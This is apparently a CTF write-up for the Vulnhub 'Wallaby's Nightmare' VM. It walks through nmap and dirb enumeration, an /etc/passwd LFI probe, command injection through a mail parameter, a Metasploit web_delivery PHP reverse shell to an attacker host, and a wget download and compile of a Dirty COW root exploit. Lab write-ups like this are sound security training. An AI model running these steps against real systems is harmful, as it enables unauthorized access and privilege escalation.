@@ -1,0 +1,62 @@
+
+Hack the Nightmare VM (CTF Challenge)
+
+Today we are going to solve Wallaby’s Nightmare CTF which is a new VM challenge of vulnhub where attacker has to achieve root flag of the targeted VM machine; you can download it from here.
+LET’S BEGIN!
+As we always start from network so that we can have target IP. In your kali Linux open the terminal and type netdiscover, now from screenshot you can see list of IP. Here 192.168.0.101 is my target IP.
+
+Enumerate the target through aggressive scan; type following command for nmap scanning:
+nmap -p- A 192.168.0.101
+So here I found three ports 22, 80, 6667 are open.
+
+Since port 80 is open I look toward browser and explore target ip 192.168.0.101 where I found a comment “enter a username to get started with this CTF” then I type the name “RAJ” and click on submit so that we could move forward into start the game.
+
+When I clicked on submit tab it linked to next web page where you can read the assign username for this CTF from screenshot now we can start this CTF when we will click on given link start the CTF!
+
+Next web page open with exclusive warning that Mr. Wallaby found raj is trying to penetrate inside the server so user “raj” is under his observation. Then soon after reading this threat   I observe at its URL I thought it might be vulnerable to etc/passwd same as LFI attack.
+
+Then I try browse following in URL 192.168.1.101/?page=/etc/passwd though the web page stand up with raw data but nothing was quite useful in this web page. And when I refresh it I lose connection from port 80. As raj was threaten by Wallaby  
+
+Again I move toward nmap so that I can make sure about port 80 but here I found a new port 60080 is open for http service as you can perceive this thing from given screenshot.
+
+Then I next my next tool dirb
+Dirb http://192.168.0.101:60080/?page=
+Now from screenshot you can see the result and currently we will look toward highlighted directory.
+
+So when I browse 192.168.0.101:60080/?page=mailer in URL the resultant web page gets opened and I found nothing especial here except “coming soon guys!”
+
+Then I look after page source code to get some clue, here inside HTML code the anchor tag contains a link for another file which you can see from screenshot.
+
+Again I browse above highlighted text 192.168.0.101:60080/?mailer&mail=pwd in URL and the web page comes outside with /var/www/html
+Hence we can say that the current page might good for executing malicious comment as command.  
+
+Now load metasploit framework to connect with victim through reverse connection
+Msfconsole
+use exploit/multi/script/web_delivery
+msf exploit (web_delivery)>set target 1
+msf exploit (web_delivery)>set payload php/meterpreter/reverse_tcp
+msf exploit (web_delivery)>set lhost 192.168.0.106 (IP of Local Host)
+msf exploit (web_delivery)>set lport 4444
+msf exploit (web_delivery)>exploit
+Now copy the generated command php….UvrG’));” and send it to target
+
+From screenshot you can see I have paste above malicious PHP comment inside url in hope to get reverse connection inside metasploit.
+
+So when I execute this comment I receive meterpreter session and get connected with victim shell
+Meterpreter> sysinfo
+Meterpreter>shell
+Now use “Dirtycow exploit” therefore type following command to download this exploit inside tmp folder of victim.
+Wget https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c
+
+Now type following command to compile your exploit so that it can run successfully inside.
+gcc cowroot.c –o cowroot -pthread
+
+Now we can run our exploit to achieve root permission and try to capture the flag
+./cowroot
+id
+cd /root
+ls
+Cat flag.txt
+Congratulation!!! We have captured the flag which you can see from screenshot and beat this task………..
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
